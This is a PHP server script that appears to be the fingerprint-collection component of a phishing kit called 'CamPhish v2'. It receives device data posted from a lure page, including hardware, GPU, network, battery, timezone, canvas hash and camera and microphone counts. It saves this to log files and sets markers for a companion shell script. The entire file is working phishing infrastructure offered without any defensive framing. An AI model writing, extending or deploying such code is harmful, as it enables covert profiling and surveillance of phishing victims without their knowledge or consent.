<?php
// CamPhish v2 - Device Fingerprint Handler

if (isset($_POST['fingerprint'])) {
    $date = date('dMYHis');
    $raw = $_POST['fingerprint'];
    
    // Decode JSON
    $data = json_decode($raw, true);
    
    if ($data && is_array($data)) {
        // Format fingerprint data
        $output = "=== Device Fingerprint ===\n";
        $output .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
        $output .= "---\n";
        
        // Device
        $output .= "[Device Info]\n";
        $output .= "  Device Type: " . ($data['deviceType'] ?? 'Unknown') . "\n";
        $output .= "  OS: " . ($data['os'] ?? 'Unknown') . "\n";
        $output .= "  Browser: " . ($data['browser'] ?? 'Unknown') . "\n";
        $output .= "  Platform: " . ($data['platform'] ?? 'Unknown') . "\n";
        $output .= "  User Agent: " . ($data['userAgent'] ?? 'Unknown') . "\n";
        $output .= "\n";
        
        // Screen
        $output .= "[Screen]\n";
        $output .= "  Resolution: " . ($data['screenWidth'] ?? '?') . "x" . ($data['screenHeight'] ?? '?') . "\n";
        $output .= "  Available: " . ($data['screenAvailWidth'] ?? '?') . "x" . ($data['screenAvailHeight'] ?? '?') . "\n";
        $output .= "  Color Depth: " . ($data['colorDepth'] ?? '?') . " bit\n";
        $output .= "  Pixel Ratio: " . ($data['pixelRatio'] ?? '?') . "\n";
        $output .= "  Orientation: " . ($data['orientation'] ?? 'Unknown') . "\n";
        $output .= "\n";
        
        // Hardware
        $output .= "[Hardware]\n";
        $output .= "  CPU Cores: " . ($data['cpuCores'] ?? 'Unknown') . "\n";
        $output .= "  Device Memory: " . ($data['deviceMemory'] ?? 'Unknown') . " GB\n";
        $output .= "  Touch Support: " . (($data['touchSupport'] ?? false) ? 'Yes' : 'No') . "\n";
        $output .= "  Max Touch Points: " . ($data['maxTouchPoints'] ?? '0') . "\n";
        $output .= "  GPU: " . ($data['gpuRenderer'] ?? 'Unknown') . "\n";
        $output .= "  GPU Vendor: " . ($data['gpuVendor'] ?? 'Unknown') . "\n";
        $output .= "\n";
        
        // Network
        $output .= "[Network]\n";
        $output .= "  Type: " . ($data['networkType'] ?? 'Unknown') . "\n";
        $output .= "  Downlink: " . ($data['networkDownlink'] ?? 'Unknown') . " Mbps\n";
        $output .= "  RTT: " . ($data['networkRtt'] ?? 'Unknown') . " ms\n";
        $output .= "  Online: " . (($data['onLine'] ?? false) ? 'Yes' : 'No') . "\n";
        $output .= "\n";
        
        // Battery
        $output .= "[Battery]\n";
        $output .= "  Level: " . ($data['batteryLevel'] ?? 'Unknown') . "\n";
        $output .= "  Charging: " . (isset($data['batteryCharging']) ? ($data['batteryCharging'] ? 'Yes' : 'No') : 'Unknown') . "\n";
        $output .= "\n";
        
        // Other
        $output .= "[Other]\n";
        $output .= "  Language: " . ($data['language'] ?? 'Unknown') . "\n";
        $output .= "  Languages: " . ($data['languages'] ?? 'Unknown') . "\n";
        $output .= "  Timezone: " . ($data['timezone'] ?? 'Unknown') . "\n";
        $output .= "  Cookies: " . (($data['cookiesEnabled'] ?? false) ? 'Enabled' : 'Disabled') . "\n";
        $output .= "  Do Not Track: " . ($data['doNotTrack'] ?? 'Not set') . "\n";
        $output .= "  Canvas Hash: " . ($data['canvasHash'] ?? 'Unknown') . "\n";
        $output .= "  Cameras: " . ($data['camerasCount'] ?? '?') . "\n";
        $output .= "  Microphones: " . ($data['micsCount'] ?? '?') . "\n";
        $output .= "===========================\n\n";
        
        // Save individual file
        $file = 'fingerprint_' . $date . '.txt';
        file_put_contents($file, $output);
        
        // Save to master file
        $masterFile = 'saved.fingerprints.txt';
        file_put_contents($masterFile, $output, FILE_APPEND);
        
        // Create current fingerprint for shell script detection
        file_put_contents('current_fingerprint.txt', $output);
        
        // Create marker for shell script
        file_put_contents('FingerprintLog.log', "Fingerprint captured\n", FILE_APPEND);
        
        // Save to fingerprints directory
        if (!is_dir('saved_fingerprints')) {
            mkdir('saved_fingerprints', 0755, true);
        }
        copy($file, 'saved_fingerprints/' . $file);
        
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success']);
    } else {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Invalid data']);
    }
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
}

exit();
?>
